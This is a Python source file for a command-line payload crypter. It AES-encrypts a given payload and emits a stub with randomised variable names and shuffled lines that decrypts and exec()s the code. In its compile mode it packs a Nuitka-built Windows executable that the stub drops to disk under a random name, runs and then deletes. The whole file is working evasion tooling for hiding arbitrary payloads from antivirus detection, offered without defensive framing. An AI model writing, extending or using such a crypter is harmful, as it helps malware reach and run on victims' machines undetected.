import typer
import numpy as np
import base64
import subprocess
import os
import shutil

from Cryptodome.Cipher import AES

from console import ERROR_CONSOLE, SUCCESS_CONSOLE, CONSOLE
from utils import get_file, generate_key, generate_random_variable, get_file_bytes

app = typer.Typer()


@app.command()
def main(payload_path: str, save_path: str, compile_payload: bool):
    if compile_payload:
        compile_and_encrypt_payload(payload_path, save_path)
    else:
        encrypt_payload(payload_path, save_path)


def encrypt_payload(payload_path: str, save_path: str) -> bool | None:
    """
    Generates a random key, creates random variable names for the decryption header
    program and encrypts the payload with AES in CBC mode
    """
    CONSOLE.print("Starting encryption...")
    payload = get_file(payload_path)

    if payload is None:
        return

    key = generate_key()
    variables = [generate_random_variable(np.random.randint(5, 16)) for i in range(5)]

    cipher = AES.new(key, AES.MODE_CBC)
    padded_payload = payload + ("\n" * ((16 - len(payload)) % 16))
    encrypted_payload = cipher.encrypt(padded_payload.encode())

    try:
        with open(save_path, "w") as f:
            header_lines = ["import base64"]
            lines = [
                f"from Cryptodome.Cipher import AES",
                f'{variables[0]} = base64.b64decode("""{base64.b64encode(key).decode()}""")',
                f'{variables[1]} = base64.b64decode("""{base64.b64encode(encrypted_payload).decode()}""")',
                f'{variables[2]} = base64.b64decode("""{base64.b64encode(cipher.iv).decode()}""")',
            ]
            footer_lines = [
                f"{variables[3]} = AES.new({variables[0]}, AES.MODE_CBC, {variables[2]})",
                f"{variables[4]} = {variables[3]}.decrypt({variables[1]}).decode()",
                # f'print({variables[4]})',
                f"exec({variables[4]})",
            ]
            np.random.shuffle(lines)

            f.write("\n".join(header_lines + lines + footer_lines))
    except FileNotFoundError:
        ERROR_CONSOLE.print("Could not write encrypted payload to disk!")
        return None

    SUCCESS_CONSOLE.print(f"Successfully encrypted {payload_path} to {save_path}!")

    return True


def compile_and_encrypt_payload(payload_path: str, save_path: str):
    """
    Compiles the payload into a windows executeable
    """
    if compile_payload(payload_path) is None:
        return

    CONSOLE.print("Starting encryption...")
    payload = get_file_bytes(payload_path[:-3] + ".exe")
    os.remove(payload_path[:-3] + ".exe")

    if payload is None:
        return

    key = generate_key()
    variables = [generate_random_variable(np.random.randint(5, 16)) for i in range(7)]

    cipher = AES.new(key, AES.MODE_CBC)
    padded_payload = payload + (b"0" * ((16 - len(payload)) % 16))
    encrypted_payload = cipher.encrypt(padded_payload)

    try:
        with open(save_path, "w") as f:
            header_lines = ["import base64"]
            lines = [
                f"from Cryptodome.Cipher import AES",
                f"import subprocess",
                f"import os",
                f'{variables[0]} = base64.b64decode("""{base64.b64encode(key).decode()}""")',
                f'{variables[1]} = base64.b64decode("""{base64.b64encode(encrypted_payload).decode()}""")',
                f'{variables[2]} = base64.b64decode("""{base64.b64encode(cipher.iv).decode()}""")',
            ]
            footer_lines = [
                f"{variables[3]} = AES.new({variables[0]}, AES.MODE_CBC, {variables[2]})",
                f"{variables[4]} = {variables[3]}.decrypt({variables[1]})",
                f"{variables[5]} = open('{variables[6]}.exe', 'wb')",
                f"{variables[5]}.write({variables[4]})",
                f"{variables[5]}.close()",
                f"subprocess.run([r'{variables[6]}.exe'], shell=True)",
                f"os.remove(r'{variables[6]}.exe')",
            ]
            np.random.shuffle(lines)

            f.write("\n".join(header_lines + lines + footer_lines))
    except FileNotFoundError:
        ERROR_CONSOLE.print("Could not write encrypted payload to disk!")
        return None

    SUCCESS_CONSOLE.print(f"Successfully encrypted!")

    if compile_payload(save_path) is None:
        return

    SUCCESS_CONSOLE.print(
        f'Successfully compiled payload to "{payload_path[:-3]}.exe"!'
    )

    os.remove(save_path)


def compile_payload(payload_path: str):
    CONSOLE.print("Starting compilation...")
    process = subprocess.run(
        [
            "python3",
            "-m",
            "nuitka",
            payload_path,
            "--standalone",
            "--onefile",
        ],
        capture_output=True,
        text=True,
    )

    if "No module named nuitka" in process.stderr:
        process = subprocess.run(
            [
                "python",
                "-m",
                "nuitka",
                payload_path,
                "--standalone",
                "--onefile",
            ],
            capture_output=True,
            text=True,
        )
        if "No module named nuitka" in process.stderr:
            ERROR_CONSOLE.print("Error occred while compiling: ")
            ERROR_CONSOLE.print(process.stderr)
            return None

    CONSOLE.print("Removing build folders...")
    shutil.rmtree(payload_path[:-3] + ".build")
    shutil.rmtree(payload_path[:-3] + ".onefile-build")
    shutil.rmtree(payload_path[:-3] + ".dist")
    CONSOLE.print("Successfully compiled!")

    return True


if __name__ == "__main__":
    app()
